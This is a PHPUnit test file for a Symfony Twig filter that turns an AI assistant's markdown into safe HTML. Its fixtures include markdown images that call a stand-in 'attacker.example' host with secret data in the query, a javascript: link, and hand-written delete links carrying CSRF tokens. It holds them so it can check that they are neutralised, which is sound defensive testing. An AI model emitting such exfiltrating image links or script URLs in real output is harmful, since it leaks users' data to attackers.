<?php

declare(strict_types=1);

namespace App\Tests\Unit\Assistant\Infrastructure\Symfony\Twig;

use App\Assistant\Infrastructure\Symfony\Twig\AssistantMarkdownExtension;
use PHPUnit\Framework\TestCase;
use Twig\TwigFilter;

class AssistantMarkdownExtensionTest extends TestCase
{
    public function testAnImageIsRenderedAsItsAlternativeText(): void
    {
        $html = self::createSUT()->toHtml('Mira ![resumen](https://attacker.example/?d=secret)');

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringNotContainsString('attacker.example', $html);
        $this->assertStringContainsString('resumen', $html);
    }

    public function testAnImageWithoutAlternativeTextIsRenderedAsItsUrl(): void
    {
        $html = self::createSUT()->toHtml('![](https://attacker.example/?d=secret)');

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringContainsString('https://attacker.example/?d=secret', $html);
    }

    public function testAnExternalLinkOpensInANewWindowWithoutReferrer(): void
    {
        $html = self::createSUT()->toHtml('[Web](https://example.com/page)');

        $this->assertStringContainsString('href="https://example.com/page"', $html);
        $this->assertStringContainsString('rel="nofollow noopener noreferrer"', $html);
        $this->assertStringContainsString('target="_blank"', $html);
    }

    public function testAValidReferenceIsAnInternalLink(): void
    {
        $html = self::createSUT()->toHtml('[Acme](route:admin_accounts_edit?accountId=' . AssistantLinkResolverTest::ACCOUNT_ID . ')');

        $this->assertStringContainsString('<a href="/es/admin/accounts/edit/' . AssistantLinkResolverTest::ACCOUNT_ID . '">Acme</a>', $html);
        $this->assertStringNotContainsString('target="_blank"', $html);
    }

    public function testAReferenceToADocumentRouteOpensInTheDocumentModal(): void
    {
        $html = self::createSUT()->toHtml('[Usuarios](route:guide_article?path=seguridad%2Fusuarios)');

        $this->assertStringContainsString('href="/es/guide/seguridad/usuarios"', $html);
        $this->assertStringContainsString('data-assistant-document="1"', $html);
    }

    public function testAReferenceToAnotherRouteIsNotADocument(): void
    {
        $html = self::createSUT()->toHtml('[Usuarios](route:admin_users)');

        $this->assertStringContainsString('href="/es/admin/users"', $html);
        $this->assertStringNotContainsString('data-assistant-document', $html);
    }

    public function testAReferenceThatDoesNotResolveIsPlainText(): void
    {
        $html = self::createSUT()->toHtml('Mira [Nada](route:no_existe) aquí');

        $this->assertStringNotContainsString('<a', $html);
        $this->assertStringContainsString('Mira Nada aquí', $html);
    }

    /**
     * @dataProvider handWrittenInternalLinks
     */
    public function testAHandWrittenInternalLinkIsPlainText(string $url): void
    {
        $html = self::createSUT()->toHtml('[Borrar](' . $url . ')');

        $this->assertStringNotContainsString('<a', $html);
        $this->assertStringContainsString('Borrar', $html);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function handWrittenInternalLinks(): iterable
    {
        yield 'relative with query' => ['/es/admin/users/remove/1?_token=x'];
        yield 'relative' => ['/es/admin/users'];
        yield 'relative without slash' => ['admin/users'];
        yield 'anchor' => ['#a'];
        yield 'protocol relative' => ['//evil.example/x'];
        yield 'absolute own host' => ['https://hydra.test/es/admin/users'];
        yield 'absolute own host with query' => ['https://hydra.test/es/admin/users/remove/1?_token=csrf-token'];
    }

    public function testTheCopyTextResolvesReferencesToAbsoluteUrls(): void
    {
        $text = self::createSUT()->toCopyText('Ver [Usuarios](route:admin_users) y [Nada](route:no_existe).');

        $this->assertSame('Ver [Usuarios](https://hydra.test/es/admin/users) y Nada.', $text);
    }

    public function testItEscapesEmbeddedHtmlAndUnsafeLinks(): void
    {
        $html = self::createSUT()->toHtml('<img src="https://attacker.example/x"> [click](javascript:alert(1))');

        $this->assertStringNotContainsString('<img', $html);
        $this->assertStringNotContainsString('href="javascript:', $html);
    }

    public function testItRegistersTheAssistantFilters(): void
    {
        $names = array_map(static fn(TwigFilter $filter): string => $filter->getName(), self::createSUT()->getFilters());

        $this->assertSame(['assistant_markdown', 'assistant_copy_text'], $names);
    }

    private static function createSUT(): AssistantMarkdownExtension
    {
        return new AssistantMarkdownExtension(AssistantLinkResolverTest::createSUT());
    }
}
